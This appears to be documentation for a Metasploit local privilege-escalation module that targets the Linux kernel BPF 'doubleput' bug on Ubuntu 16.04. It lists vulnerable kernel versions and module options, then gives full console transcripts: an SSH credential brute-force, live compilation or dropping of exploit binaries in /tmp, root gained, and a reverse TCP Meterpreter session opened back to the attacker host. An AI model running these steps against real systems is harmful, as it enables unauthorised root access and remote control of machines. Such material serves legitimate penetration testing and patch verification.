## Notes

This module (and the original exploit) are written in several parts: `hello`, `doubleput`, and `suidhelper`.

Mettle at times on this exploit will give back an invalid session number error.  In these cases `payload/linux/x64/shell/bind_tcp` seemed to always work.

As of PR submission, the original shell becomes unresposive when the root shell occurs.  Metasm fails to compile due to `fuse.h` being required.

As of PR submission, killing of the process `hello` and `doubleput` has to occur manually.  `/tmp/fuse_mount` also needs to be unmounted and deleted.

## Creating A Testing Environment

There are a few requirements for this module to work:

  1. `CONFIG_BPF_SYSCALL=y` must be set in the kernel (default on Ubuntu 16.04 (Linux 4.4.0-38-generic))
  2. `kernel.unprivileged_bpf_disabled` can't be set to `1` (default on Ubuntu 16.04 (Linux 4.4.0-38-generic))
  3. fuse needs to be installed (non-default on Ubuntu 16.04 (Linux 4.4.0-38-generic))
  
  Using Ubuntu 16.04, simply `sudo apt-get install fuse` and you're all set!

This module has been tested against:

  1. Ubuntu 16.04 linux-image-4.4.0-38-generic (pre-compile & live compile)
  2. Ubuntu 16.04 (default kernel) linux-image-4.4.0-21-generic (pre-compile & live compile)

This module was not tested against, but may work against:

  1. Fedora 24 < [kernel-4.5.4-300.fc24](https://bugzilla.redhat.com/show_bug.cgi?id=1334311)
  2. Fedora 23 < [kernel-4.5.5-201.fc23](https://bugzilla.redhat.com/show_bug.cgi?id=1334311)
  3. Fedora 22 < [kernel-4.4.10-200.fc22](https://bugzilla.redhat.com/show_bug.cgi?id=1334311)
  4. Debian >= 4.4~rc4-1~exp1, < Fixed in version [4.5.3-1](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=823603)
  5. Ubuntu 14.04.1 <= [4.4.0-22.39](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1578705/comments/3)

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  4. Do: `use exploit/linux/local/bpf_priv_esc`
  5. Do: `set session #`
  6. Do: `set verbose true`
  7. Do: `exploit`

## Options

  **MAXWAIT**

  The first stage of this priv esc can take ~35seconds to execute.  This is the timer on how long we should wait till we give up on the first stage finishing.  Defaults to 120 (seconds)

  **WritableDir**

  A folder we can write files to.  Defaults to /tmp

  **COMPILE**
  
  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to Auto

## Scenarios

### Ubuntu 16.04 (with Linux 4.4.0-38-generic)

#### Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set rhosts 192.168.199.130
    rhosts => 192.168.199.130
    msf auxiliary(ssh_login) > set username ubuntu
    username => ubuntu
    msf auxiliary(ssh_login) > set password ubuntu
    password => ubuntu
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) Linux ubuntu 4.4.0-38-generic #57-Ubuntu SMP Tue Sep 6 15:42:33 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.199.131:39175 -> 192.168.199.130:22) at 2016-09-27 12:25:31 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

#### Escalate

In this scenario, gcc and libfuse-dev are both installed so we can live compile on the system.

    msf auxiliary(ssh_login) > use exploit/linux/local/bpf_priv_esc
    msf exploit(bpf_priv_esc) > set verbose true
    verbose => true
    msf exploit(bpf_priv_esc) > set session 1
    session => 1
    msf exploit(bpf_priv_esc) > set lhost 192.168.199.131
    lhost => 192.168.199.131
    msf exploit(bpf_priv_esc) > exploit
    
    [*] Started reverse TCP handler on 192.168.199.131:4444 
    [+] CONFIG_BPF_SYSCAL is set to yes
    [+] kernel.unprivileged_bpf_disabled is NOT set to 1
    [+] fuse is installed
    [+] libfuse-dev is installed
    [+] gcc is installed
    [*] Live compiling exploit on system
    [*] Writing files to target
    [*] Writing hello to /tmp/hello.c
    [*] Max line length is 65537
    [*] Writing 2760 bytes in 1 chunks of 9767 bytes (octal-encoded), using printf
    [*] Writing doubleput to /tmp/doubleput.c
    [*] Max line length is 65537
    [*] Writing 5182 bytes in 1 chunks of 18218 bytes (octal-encoded), using printf
    [*] Writing suidhelper to /tmp/suidhelper.c
    [*] Max line length is 65537
    [*] Writing 352 bytes in 1 chunks of 1219 bytes (octal-encoded), using printf
    [*] Compiling all modules on target
    [*] Writing payload to /tmp/AyDJSaMM
    [*] Max line length is 65537
    [*] Writing 188 bytes in 1 chunks of 506 bytes (octal-encoded), using printf
    [*] Starting execution of priv esc.  This may take about 120 seconds
    [+] got root, starting payload
    [*] Transmitting intermediate stager...(126 bytes)
    [*] Sending stage (2412016 bytes) to 192.168.199.130
    [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:43734) at 2016-09-27 12:26:06 -0400
    [*] Cleaning up...
    
    meterpreter > getuid
    Server username: uid=0, gid=0, euid=0, egid=0
    meterpreter > sysinfo
    Computer     : 192.168.199.130
    OS           : Ubuntu 16.04 (Linux 4.4.0-38-generic)
    Architecture : x86_64
    Meterpreter  : x64/linux
    
#### Escalate w/ pre-compiled binaries

It is possible to force pre-compiled binaries, however in this case we look at a system that doesn't have libfuse-dev (ubuntu) installed

    msf auxiliary(ssh_login) > use exploit/linux/local/bpf_priv_esc
    msf exploit(bpf_priv_esc) > set verbose true
    verbose => true
    msf exploit(bpf_priv_esc) > set session 1
    session => 1
    msf exploit(bpf_priv_esc) > set lhost 192.168.199.131
    lhost => 192.168.199.131
    msf exploit(bpf_priv_esc) > exploit
    
    [*] Started reverse TCP handler on 192.168.199.131:4444 
    [+] CONFIG_BPF_SYSCAL is set to yes
    [+] kernel.unprivileged_bpf_disabled is NOT set to 1
    [+] fuse is installed
    [-] libfuse-dev is not installed.  Compiling will fail.
    [*] Dropping pre-compiled exploit on system
    [*] Writing pre-compiled binarys to target
    [*] Max line length is 65537
    [*] Writing 9576 bytes in 1 chunks of 24954 bytes (octal-encoded), using printf
    [*] Max line length is 65537
    [*] Writing 13920 bytes in 1 chunks of 36828 bytes (octal-encoded), using printf
    [*] Max line length is 65537
    [*] Writing 8840 bytes in 1 chunks of 21824 bytes (octal-encoded), using printf
    [*] Writing payload to /tmp/AyDJSaMM
    [*] Max line length is 65537
    [*] Writing 188 bytes in 1 chunks of 506 bytes (octal-encoded), using printf
    [*] Starting execution of priv esc.  This may take about 120 seconds
    [+] got root, starting payload
    [-] This exploit may require process killing of 'hello', and 'doubleput' on the target
    [-] This exploit may requires manual umounting of /tmp/fuse_mount via 'fusermount -z -u /tmp/fuse_mount' on the target
    [-] This exploit may requires manual deletion of /tmp/fuse_mount via 'rm -rf /tmp/fuse_mount' on the target
    [*] Transmitting intermediate stager...(126 bytes)
    [*] Sending stage (2412016 bytes) to 192.168.199.130
    [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:55522) at 2016-09-28 08:08:04 -0400
    
    meterpreter > getuid
    Server username: uid=0, gid=0, euid=0, egid=0
